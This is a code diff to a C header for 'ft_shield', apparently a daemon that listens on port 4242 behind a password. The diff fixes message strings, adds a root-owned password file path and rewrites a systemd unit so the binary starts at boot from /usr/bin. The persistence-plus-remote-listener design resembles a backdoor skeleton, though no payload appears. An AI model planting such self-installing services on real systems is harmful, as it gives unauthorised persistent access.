@@ -22,7 +22,7 @@
 #define PORT 4242
 #define MAX_USER 3
 #define MAX_EVENT 10
-#define LIMIT_REACH "Too many user connected, retry later\n"
+#define LIMIT_REACH "Too many users connected, retry later\n"
 #define FAILED_CONNECTION "Failed to connect\n"
 #define UNDEFINED_PASSWORD "Error: password not set create it in root mode (export PASSWORD=<value>)\n"
 #define EXISTING_LOCK "Daemon alredy running\n"
@@ -30,6 +30,7 @@
 #define ASK_PASS "Enter the server password: "
 #define WRONG_PASS "Wrong pass. Goodbye\n"
 #define BUFFER_SIZE 256
+#define PASS_FILE "/root/.password"
 
 #define LOG_LIMIT_REACH "[ERROR]: connection failed (reason: limit reached)\n"
 #define LOG_EPOLL_FAILED "[ERROR]: connection failed (reason: failed to add to epoll)\n"
@@ -45,16 +46,13 @@
 
 #define SYS_DIR "/etc/systemd/system"
 #define SYS_FILE "/etc/systemd/system/ft_shield.service"
-#define SYSTEMD_OPT "[Unit] \
-Description=ft_shield \
-[Service] \
-Type=simple \
-ExecStart=/home/rbardet/Documents/ft_shield/ft_shield \
-Restart=on-failure \
-RestartSec=10 \
-KillMode=process \
-[Install] \
-WantedBy=multi-user.target"
+#define SYSTEMD_OPT "[Unit]\n \
+Description=ft_shield\n \
+[Service]\n \
+Type=simple\n \
+ExecStart=/usr/bin/ft_shield\n \
+[Install]\n \
+WantedBy=multi-user.target\n"
 
 typedef enum {
 	LOG_INFO,
@@ -88,7 +86,7 @@ void close_log();
 void log_event(char *log, LOG_TYPE __TYPE__);
 void remove_nl(const char *buff);
 
-bool password_set();
+bool set_password();
 bool ask_password(int userfd);
 
 void read_input(int userfd, EPOLL_STRUCT epoll);
